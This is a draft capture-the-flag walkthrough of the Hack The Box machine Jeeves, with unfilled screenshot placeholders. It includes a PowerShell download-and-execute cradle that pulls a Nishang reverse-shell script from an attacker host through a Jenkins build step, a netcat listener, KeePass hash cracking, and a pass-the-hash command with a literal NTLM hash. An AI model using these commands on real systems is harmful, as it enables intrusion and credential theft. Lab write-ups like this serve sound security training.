## Hack The Box - Jeeves (10.10.10.63)
Jeeves is a medium box from Hack The Box and it is a Windows machine. It presents a minor rabit hole but with enough enumeration and familiarity with Windows powershell, Netcat, and Hashcat attackers should have no issue obtaining their flags. 


### Enumeration
To begin with, we will start an nmap scan on our target as part of our first enumeration steps. For this, I will opt to use nmapAutomator, although you can run a traditional nmap scan. 

```markdown
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We have four open ports on our target machine. After no success with enumerating port 445 (SMB) I decide to open our target machine in a web browser to view what is hosted on port 80 (http://10.10.10.63:80). It appears our target is running ‘Ask Jeeves’ as a service and is running on ‘Microsoft-IIS/10.0’. I will ran a DirBuster scan to enumerate furthur files and directories here but did not obtain anything useful. 


<INSERT SCREENSHOT>

Continueing with our enumeration, I decided to view what is hosted on port 50000 (http://10.10.10.63:50000). It appears our target is running Jetty on this port and it may be running on version 9.4.x according to our nmap scan from earlier. 

<INSERT SCREENSHOT (jetty.png)>

As I run another DirBuster scan on our target machine and port 50000 I decide to research possible exploits available for Jetty 9.4.x and later. After attempting several exploits from GitHub, ExploitDB, and Metasploit I decided that their must be another method to obtain our initial foothold. My DirBuster scan from earlier has finished and has reveiled a new directory (/askjeeves). 

<INSERT SCREENSHOT>

It appears our target is hosting an application called Jenkins, a software for developers to automatically build, test, and deploy their software. 

<INSERT SCREENSHOT Jenkins.png)

After poking around the application it appears that we are able to build and deploiy new projects without any restriction. We will go to ‘New Item > Freeestyle project’ and name our project whatever we choose. On the next page, we are given several options and the most interesting is the ‘Build’ sections where we can select ‘Execute Windows batch command’ as an option. Intresting! Let us craft a payload using a powershell one-liner and Nishang's Invoke-PowerShellTcp.ps1 script. 

### Initial Foothold
We will append the following line to the very end of our Invoke-PowerShellTcp.ps1 script to enable the callback to our attacker machine once executed on our target machine. Please ensure to change ‘10.10.10.10.’ to your IP Address and ‘4444’ to the port which you will be listening on for your reverse shell (netcat will be utilized for this step and will be explained later). 

<INSERT CODE BELOW> 
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 

Great, our script is ready to go! Let's host it on our attacker machine utilizing either SimpleHTTPServer or http.server (either will work). 

<INSERT CODE BELOW>
python -m SimpleHTTPServer 8080
or
python3 -m http.server 8080


Our attacker machine is now hosting 'Invoke-PowerShellTcp.ps1' on our IP address on port 8080. Once downloaded and executed by our target it will send a reverse shell to our attacker machine. We will catch this reverse shell utilizing Netcat. To do this, execute the below command and ensure that the port listed in this command is the same listed at the bottom of our Invoke-PowerShellTcp.ps1 script from earlier. 

<INSERT CODE BELOW>
nc -lvnp 4444

Time to get our intial foothold. Powershell's IEX is a powerfull resource to have in your toolkit so if this is your first time using it, make sure to commit the following to memory because there will be plenty of opportunities to use it again. We will be executing the following powershell one-liner code in the ‘Execute Windows batch command’ box of our Jenkins application. Before doing so, ensure that 10.10.10.10 is replaced with your attacker machine's IP address. 

<INSERT CODE BELOW>
powershell IEX (New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/Invoke-PowerShellTcp.ps1');

<INSERT SCREENSHOT build.png>

Click ‘Save’ and ‘Build Now’ to see your file get pulled from your attacker machine and executed on the target machine to provide you with your reverse shell caught by Netcat. Congradulations, we have our intial foothold and appear to be a user name ‘kohsuke’. Let us continue with our privledge escalation. 

<INSERT SCREENSHOT foothold.png>

### Privledge Escalation
After searching around our target's machine I notice there is a file called ‘CEH.kdbx’ located in ‘C:\Users\kohsuke\Documents’. This file extention is indictive of a keepass file which we will be using keepass2john and hashcat to crack and obtain the cleartext password. So first, download the file to your local attacker machine. 

<INSERT SCREENSHOT CEH.png>

On your attacker machine run the following command to turn your .kdbx file into a hash we can feed into hashcat for a cleartext password.

<INSERT CODE BELOW>
keepass2john CEH.kdbx > CEH.hash
<insert SCREENSHOT HASH.png>

We will now feed this hash file (CEH.hash) into a tool called hashcat which will provide us with the cleartext password. For this password crack I will be utilizing rockyou.txt as a password file but I encourage everyone to checkout SecLists for more resources. 

<INSERT CODE BELOW>
hashcat -m 13400 CEH.hash rockyou.txt

OUTPUT:
<INSERTSCREENSHOT hashcat.png>

With our password being ‘moonshine1’ we can now view the contents of the keepass file!

<INSERT SCREENSHOT keepass.png>


Viewing all the entries it seems like ‘Backup stuff’ contains an NTLM hash in the password feild. 

<INSERT CODE BELOW>
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

We can use a pass-the-hash attack to gain access to our target's machine as Administrator. We will use pth-winexe for this attack.

<INSERT CODE BELOW>
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe

<INSERT SCREENSHOOT pth-winexe.png>

  ###Closing Remarks
  We are now Administrator! Before ending this, it is worth nothing that you may not be able to obtain your root flag as easily as the user flag. This is because their is a file stream via the ‘hm.txt’ file located in C:\Users\Administrator\Desktop' and it can only be see by appending /r to your ‘dir’ command. 

<INSERT SCREENSHOT dir.png>

Utilize the following command to obtain your root flag.

<INSERT CODE BELOW>
powershell Get-Content -path C:\Users\Administrator\Desktop\hm.txt -stream root.txt

Thanks for reading! 
